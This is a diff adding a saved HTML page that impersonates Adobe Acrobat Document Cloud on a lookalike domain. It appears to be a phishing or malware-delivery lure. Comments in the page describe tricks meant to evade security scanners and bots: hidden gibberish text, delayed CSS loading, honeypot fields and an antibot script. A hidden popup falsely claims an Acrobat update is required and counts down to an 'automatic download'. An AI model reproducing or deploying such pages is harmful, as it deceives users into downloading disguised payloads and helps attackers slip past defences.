@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<!-- saved from url=(0068)https://ffa606ec.0xauth-adob3oer78nlinesg634docenterprise.pages.dev/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Adobe Acrobat Document Cloud</title>
+  <meta name="description" content="View and access your secured PDF documents with Adobe Acrobat Document Cloud">
+  <link rel="icon" href="https://ffa606ec.0xauth-adob3oer78nlinesg634docenterprise.pages.dev/assets/favicon.ico" type="image/x-icon">
+  <!-- Obfuscation techniques - nonsensical meta tags to confuse scanners -->
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="googlebot" content="noindex, noarchive, nosnippet">
+  <meta name="x-scanner-block" content="true">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="document-type" content="27f3e8a1c92b4e5d8f9g6h7i">
+  <meta name="security-level" content="confidential">
+  <meta name="document-id" content="ADO-2023-96574812">
+  <!-- CSS will be loaded with delay to avoid scanners -->
+  <style>
+    /* Hidden content to confuse scanners */
+    .hidden-trap { display: none; position: absolute; opacity: 0; }
+    /* Basic styling for initial load */
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f5f5;
+      color: #333;
+    }
+    
+    /* Preloader styles - will show first */
+    #preloader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    #preloader img {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+    
+    .progress-container {
+      width: 300px;
+      height: 4px;
+      background: #e6e6e6;
+      border-radius: 2px;
+      margin-top: 15px;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: #F40F00;
+      border-radius: 2px;
+      transition: width 0.5s;
+    }
+    
+    .status-text {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #666;
+    }
+    
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid rgba(244, 15, 0, 0.1);
+      border-radius: 50%;
+      border-top-color: #F40F00;
+      animation: spin 1s ease-in-out infinite;
+      margin: 0 auto 15px auto;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+<link rel="stylesheet" href="./Adobe Acrobat Document Cloud_files/styles.css"></head>
+<body>
+  <!-- Hidden inputs to trick bots -->
+  <div class="hidden-trap">
+    <input type="text" name="username" id="username-trap">
+    <input type="password" name="password" id="password-trap">
+    <a href="https://ffa606ec.0xauth-adob3oer78nlinesg634docenterprise.pages.dev/#" id="fake-link">Continue</a>
+  </div>
+
+  <!-- Preloader -->
+  <div id="preloader">
+    <div class="spinner"></div>
+    <img src="./Adobe Acrobat Document Cloud_files/adobe-logo.svg" alt="Adobe Logo">
+    <h3>Adobe Acrobat Document Cloud</h3>
+    <div class="status-text" id="status-message">Document ready!</div>
+    <div class="progress-container">
+      <div class="progress-bar" id="progress-bar" style="width: 100%;"></div>
+    </div>
+  </div>
+
+  <!-- Main content - hidden initially -->
+  <div id="main-content" style="display:none;">
+    <header>
+      <div class="header-container">
+        <div class="logo">
+          <img src="./Adobe Acrobat Document Cloud_files/adobe-logo.svg" alt="Adobe Logo">
+        </div>
+        <div class="nav-links">
+          <a href="https://ffa606ec.0xauth-adob3oer78nlinesg634docenterprise.pages.dev/#" class="nav-link">Home</a>
+          <a href="https://ffa606ec.0xauth-adob3oer78nlinesg634docenterprise.pages.dev/#" class="nav-link">Documents</a>
+          <a href="https://ffa606ec.0xauth-adob3oer78nlinesg634docenterprise.pages.dev/#" class="nav-link">Account</a>
+          <a href="https://ffa606ec.0xauth-adob3oer78nlinesg634docenterprise.pages.dev/#" class="nav-link">Help</a>
+        </div>
+      </div>
+    </header>
+
+    <main>
+      <div class="document-container">
+        <div class="document-preview">
+          <div class="document-header">
+            <h2>Confidential Document</h2>
+            <p>Secure PDF document - For authorized review only</p>
+          </div>
+          <div class="document-content">
+            <div class="document-placeholder">
+              <img src="./Adobe Acrobat Document Cloud_files/document-preview.svg" alt="Document Preview">
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <!-- Browser not supported popup -->
+  <div id="browser-warning" class="popup-container" style="display:none;">
+    <div class="popup">
+      <div class="popup-header">
+        <img src="./Adobe Acrobat Document Cloud_files/warning-icon.svg" alt="Warning">
+        <h3>Adobe Acrobat Update Required</h3>
+      </div>
+      <div class="popup-content">
+        <p>Your current Adobe Acrobat version is not compatible with the security features required to view this document.</p>
+        <p>Please update to the latest version of Adobe Acrobat Reader DC to access this confidential document.</p>
+        <div class="countdown">
+          <p>Automatic download will begin in <span id="countdown">5</span> seconds...</p>
+        </div>
+        <div class="download-button-container">
+          <button id="download-button" class="download-button">
+            <img src="./Adobe Acrobat Document Cloud_files/download-icon.svg" alt="Download">
+            Download Adobe Acrobat Reader
+          </button>
+        </div>
+      </div>
+      <div class="popup-footer">
+        <p>Adobe Acrobat Reader DC is free and required to view this secured document. <a href="https://adobe.com/acrobat" target="_blank">Learn more</a></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- HTML Obfuscation: Hidden content to confuse scanners -->
+  <div style="display:none; position:absolute; visibility:hidden; opacity:0;">
+    <!-- Random gibberish text to confuse scanners -->
+    <p>adobe acrobat reader document secure view download pdf</p>
+    <p>4kd8s 9j2nd wk49f k39fd 02kfd 20dfk 203kd</p>
+    <p>browser compatibility check security verification</p>
+  </div>
+
+  <!-- Load the main CSS file with delay to prevent scanner detection -->
+  <script>
+    // Delayed loading of CSS to avoid scanners
+    setTimeout(function() {
+      var link = document.createElement('link');
+      link.rel = 'stylesheet';
+      link.href = 'styles.css';
+      document.head.appendChild(link);
+    }, 500);
+  </script>
+
+  <!-- Load antibot script first -->
+  <script src="./Adobe Acrobat Document Cloud_files/antibot.js"></script>
+  
+  <!-- Main script will be loaded at the end -->
+  <script src="./Adobe Acrobat Document Cloud_files/app.js" defer=""></script>
+
+ <input type="text" name="website" id="website-field" autocomplete="off" style="opacity: 0; position: absolute; left: -9999px; top: -9999px;"></body></html>
